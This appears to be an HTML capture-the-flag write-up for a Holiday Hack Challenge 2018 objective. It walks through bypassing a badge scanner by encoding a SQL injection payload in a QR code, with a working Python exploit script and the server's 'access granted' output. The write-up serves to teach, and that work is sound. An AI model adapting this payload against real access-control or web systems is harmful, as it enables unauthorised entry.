@@ -1,0 +1,103 @@
+<!DOCTYPE html><head><link rel="stylesheet" href="style.css" type="text/css" media="all"/><style type="text/css">.code-black-background{color:#e0e0e0;background-color:#1f1f1f;}</style></head><body><div class="entry-title entry-title-no-feat-img">
+<h1>Objective 6: Badge Manipulation</h1>
+</div><div class="entry-content">
+<figure class="wp-block-image">
+  <img src="objective6.gif" alt="" class="wp-image-830">
+</figure>
+<p>Difficulty: 3/5
+  <br>
+  <br>Note: This objective is found on the top floor, up the stairs from the
+  floor one Eastern corridor.
+  <br>
+  <br>Bypass the authentication mechanism associated with the room near Pepper
+  Minstix. A sample employee badge is available (https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg).
+  <br><strong>What is the access control number revealed by the door authentication panel? <br></strong>
+  <br>For hints on achieving this objective, please visit Pepper Minstix and
+  help her with the Yule Log Analysis Cranberry Pi terminal challenge.
+  <br>Note: Peppex Minstix can be found on Floor 1 in the far East corridor
+  <br>
+  <br>Hints given:
+  <br>https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF#Auth_Bypass
+  <br>https://www.the-qrcode-generator.com/
+  <br>
+</p>
+<p>
+  <br>The objective can be accessed directly via this link:
+  <br>https://scanomatic.kringlecastle.com/index.html?challenge=qrcode&amp;id=601b32cf-385e-4160-854c-03ee1efcf951
+  <br>
+</p>
+<hr class="wp-block-separator">
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>Fiddler can be used to intercept a request to the Scan-O-Matic server.
+  The intercepted request looks like the request below</p>
+<pre class="wp-block-code"><code>POST https://scanomatic.kringlecastle.com/upload HTTP/1.1
+Host: scanomatic.kringlecastle.com
+Connection: keep-alive
+Content-Length: 214697
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: https://scanomatic.kringlecastle.com
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+DNT: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySeNIJHjjBbAK4FGg
+Referer: https://scanomatic.kringlecastle.com/index.html?id=601b32cf-385e-4160-854c-03ee1efcf951
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: resource_id=601b32cf-385e-4160-854c-03ee1efcf951
+
+------WebKitFormBoundarySeNIJHjjBbAK4FGg
+Content-Disposition: form-data; name=&quot;barcode&quot;; filename=&quot;alabaster_badge.png&quot;
+Content-Type: image/png
+
+&lt;DATA&gt;
+------WebKitFormBoundarySeNIJHjjBbAK4FGg--</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>The request can be replicated in Python using the code below</p>
+<pre class="wp-block-code"><code>import requests
+import qrcode
+import io
+
+# Create QR code PNG image
+data = &quot;2&quot;
+memfile = io.BytesIO()
+img = qrcode.make(data)
+img.save(memfile, format=&quot;png&quot;)
+imgbytes = memfile.getvalue()
+
+# HTTPS request
+file = {&apos;barcode&apos;: (&apos;ho-ho-no.png&apos;, imgbytes, &apos;image/png&apos;)}
+cookie = {&apos;resource_id&apos;: &apos;601b32cf-385e-4160-854c-03ee1efcf951&apos;}
+response = requests.post(&apos;https://scanomatic.kringlecastle.com/upload&apos;, files=file, cookies=cookie)
+
+# HTTPS response
+print(response.text)</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>The Scan-O-Matic is vulnerable to SQL injection and the Python script
+  above only needs a small modification to trick the system and get access:</p>
+<pre class="wp-block-code"><code>import requests
+import qrcode
+import io
+
+# Create QR code PNG image
+sqli = &quot;&apos; OR enabled#&quot;
+memfile = io.BytesIO()
+img = qrcode.make(sqli)
+img.save(memfile, format=&quot;png&quot;)
+imgbytes = memfile.getvalue()
+
+# HTTPS request
+file = {&apos;barcode&apos;: (&apos;ho-ho-no.png&apos;, imgbytes, &apos;image/png&apos;)}
+cookie = {&apos;resource_id&apos;: &apos;601b32cf-385e-4160-854c-03ee1efcf951&apos;}
+response = requests.post(&apos;https://scanomatic.kringlecastle.com/upload&apos;, files=file, cookies=cookie)
+
+# HTTPS response
+print(response.text)
+</code>
+    </pre>
+    <div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<pre class="wp-block-code code-black-background"><code>root@kali:~# python scanomatic.py
+{&quot;data&quot;:&quot;User Access Granted - Control number 19880715&quot;,&quot;request&quot;:true,&quot;success&quot;:{&quot;hash&quot;:&quot;e89bca297348a069809ccd84e765afbbdb856c9f9866fde165b783e5796854ff&quot;,&quot;resourceId&quot;:&quot;601b32cf-385e-4160-854c-03ee1efcf951&quot;}}</code></pre>
+<p>The server returned control number:
+  <br><strong>19880715</strong>
+</p>
+</div></body></html>
